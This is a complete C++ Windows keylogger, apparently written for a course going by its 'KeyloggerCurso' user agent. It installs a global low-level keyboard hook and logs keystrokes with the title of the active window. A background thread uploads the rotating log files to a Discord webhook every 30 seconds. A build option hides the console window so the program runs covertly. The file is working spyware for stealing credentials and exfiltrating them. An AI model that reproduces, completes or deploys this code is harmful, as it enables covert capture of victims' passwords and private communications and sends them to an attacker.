#define UNICODE
#include <windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <ctime>
#include <map>
#include <mutex>
#include <curl/curl.h>

#define visible
#define bootwait
#define FORMAT 0
#define mouseignore

static std::string g_webhook_url;

static const int ENVIO_INTERVALO_SEG = 30;
static const int ROTACION_INTERVALO_SEG = 30;

static const char* LOGS_DIR       = "logs";
static const char* LOGS_SENT_DIR  = "logs\\enviados";

#if FORMAT == 0
const std::map<int, std::string> keyname{
    {VK_BACK, "[BACKSPACE]"}, {VK_RETURN, "\n"}, {VK_SPACE, "_"},
    {VK_TAB, "[TAB]"}, {VK_SHIFT, "[SHIFT]"}, {VK_LSHIFT, "[LSHIFT]"},
    {VK_RSHIFT, "[RSHIFT]"}, {VK_CONTROL, "[CONTROL]"}, {VK_LCONTROL, "[LCONTROL]"},
    {VK_RCONTROL, "[RCONTROL]"}, {VK_MENU, "[ALT]"}, {VK_LWIN, "[LWIN]"},
    {VK_RWIN, "[RWIN]"}, {VK_ESCAPE, "[ESCAPE]"}, {VK_END, "[END]"},
    {VK_HOME, "[HOME]"}, {VK_LEFT, "[LEFT]"}, {VK_RIGHT, "[RIGHT]"},
    {VK_UP, "[UP]"}, {VK_DOWN, "[DOWN]"}, {VK_PRIOR, "[PG_UP]"},
    {VK_NEXT, "[PG_DOWN]"}, {VK_OEM_PERIOD, "."}, {VK_DECIMAL, "."},
    {VK_OEM_PLUS, "+"}, {VK_OEM_MINUS, "-"}, {VK_ADD, "+"},
    {VK_SUBTRACT, "-"}, {VK_CAPITAL, "[CAPSLOCK]"},
};
#endif

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

char output_filename[64];
time_t ultima_rotacion = 0;

std::mutex g_file_mutex;

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
        Save(kbdStruct.vkCode);
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        MessageBox(NULL, L"Failed to install hook!", L"Error", MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    std::lock_guard<std::mutex> lock(g_file_mutex);

    std::stringstream output;
    static char lastwindow[256] = "";

#ifndef mouseignore
    if ((key_stroke == 1) || (key_stroke == 2)) return 0;
#endif

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    struct tm tm_info;
    const time_t t = time(NULL);
    localtime_s(&tm_info, &t);

    if (foreground)
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);
        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            char s[64];
            strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
            output << "\n\n[Window: " << window_title << " - at " << s << "] ";
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end())
    {
        output << keyname.at(key_stroke);
    }
    else
    {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
            (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
        if (!lowercase) key = tolower(key);
        output << char(key);
    }
#endif

    if (t - ultima_rotacion >= ROTACION_INTERVALO_SEG || ultima_rotacion == 0)
    {
        ultima_rotacion = t;
        output_file.close();

        CreateDirectoryA(LOGS_DIR, NULL);
        CreateDirectoryA(LOGS_SENT_DIR, NULL);

        strftime(output_filename, sizeof(output_filename),
                 "logs/%Y-%m-%d__%H-%M-%S.log", &tm_info);

        output_file.open(output_filename, std::ios_base::app);
        if (output_file.is_open())
            std::cout << "Logging output to " << output_filename << std::endl;
        else
            std::cerr << "ERROR: no se pudo abrir " << output_filename << std::endl;
    }

    output_file << output.str();
    output_file.flush();
    std::cout << output.str();
    return 0;
}

static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp)
{
    return size * nmemb;
}

bool enviarArchivoADiscord(const std::string& rutaArchivo)
{
    if (g_webhook_url.empty())
    {
        std::cerr << "[Discord] Webhook vacío, no se envía nada.\n";
        return false;
    }

    CURL* curl = curl_easy_init();
    if (!curl) return false;

    time_t t = time(NULL);
    struct tm tm_info;
    localtime_s(&tm_info, &t);
    char fecha[64];
    strftime(fecha, sizeof(fecha), "%Y-%m-%d %H:%M:%S", &tm_info);

    std::string mensaje = "Shh - ";
    mensaje += fecha;

    std::string payload_json = "{\"content\":\"" + mensaje + "\"}";

    struct curl_httppost* post = NULL;
    struct curl_httppost* last = NULL;

    curl_formadd(&post, &last,
        CURLFORM_COPYNAME, "payload_json",
        CURLFORM_COPYCONTENTS, payload_json.c_str(),
        CURLFORM_CONTENTTYPE, "application/json",
        CURLFORM_END);

    curl_formadd(&post, &last,
        CURLFORM_COPYNAME, "file1",
        CURLFORM_FILE, rutaArchivo.c_str(),
        CURLFORM_END);

    curl_easy_setopt(curl, CURLOPT_URL, g_webhook_url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "KeyloggerCurso/1.0");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_CAINFO, "cacert.pem");

    CURLcode res = curl_easy_perform(curl);
    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    curl_formfree(post);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK)
    {
        std::cerr << "[Discord] Error curl: " << curl_easy_strerror(res) << "\n";
        return false;
    }
    if (http_code < 200 || http_code >= 300)
    {
        std::cerr << "[Discord] HTTP " << http_code << "\n";
        return false;
    }
    return true;
}

void moverAEnviados(const std::string& rutaOrigen)
{
    size_t pos = rutaOrigen.find_last_of("/\\");
    std::string nombre = (pos == std::string::npos) ? rutaOrigen : rutaOrigen.substr(pos + 1);

    std::string destino = std::string(LOGS_SENT_DIR) + "\\" + nombre;

    if (!MoveFileA(rutaOrigen.c_str(), destino.c_str()))
    {
        std::cerr << "[Mover] Fallo al mover " << rutaOrigen
                  << " (error " << GetLastError() << ")\n";
    }
    else
    {
        std::cout << "[Mover] " << rutaOrigen << " -> " << destino << "\n";
    }
}

void hiloEnvioPeriodico()
{
    while (true)
    {
        std::this_thread::sleep_for(std::chrono::seconds(ENVIO_INTERVALO_SEG));

        WIN32_FIND_DATAA findData;
        HANDLE hFind = FindFirstFileA("logs\\*.log", &findData);
        if (hFind == INVALID_HANDLE_VALUE) continue;

        std::vector<std::string> archivos;
        do
        {
            if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
            {
                archivos.push_back(std::string("logs\\") + findData.cFileName);
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);

        for (const auto& ruta : archivos)
        {
            std::cout << "[Discord] Enviando " << ruta << "...\n";
            if (enviarArchivoADiscord(ruta))
            {
                std::cout << "[Discord] OK\n";
                moverAEnviados(ruta);
            }
            else
            {
                std::cerr << "[Discord] Falló, se reintentará en "
                          << ENVIO_INTERVALO_SEG << "s\n";
            }
        }
    }
}

std::string leerWebhook()
{
    char buf[512];
    DWORD n = GetEnvironmentVariableA("DISCORD_WEBHOOK", buf, sizeof(buf));
    if (n > 0 && n < sizeof(buf)) return std::string(buf);

    std::ifstream f("webhook.txt");
    if (f.is_open())
    {
        std::string linea;
        std::getline(f, linea);
        while (!linea.empty() && (linea.back() == '\r' || linea.back() == '\n' || linea.back() == ' '))
            linea.pop_back();
        return linea;
    }

    return "";
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif
#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
    FreeConsole();
#endif
}

bool IsSystemBooting()
{
    return GetSystemMetrics(SM_SYSTEMDOCKED) != 0;
}

int main()
{
    Stealth();

#ifdef bootwait
    while (IsSystemBooting())
    {
        std::cout << "System is still booting up. Waiting 10 seconds...\n";
        Sleep(10000);
    }
#endif

    g_webhook_url = leerWebhook();
    if (g_webhook_url.empty())
    {
        std::cerr << "AVISO: no se encontró webhook (variable DISCORD_WEBHOOK "
                     "ni archivo webhook.txt). Los logs se guardarán localmente "
                     "pero no se enviarán.\n";
    }
    else
    {
        std::cout << "Webhook cargado.\n";
    }

    CreateDirectoryA(LOGS_DIR, NULL);
    CreateDirectoryA(LOGS_SENT_DIR, NULL);

    std::thread(hiloEnvioPeriodico).detach();

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}
}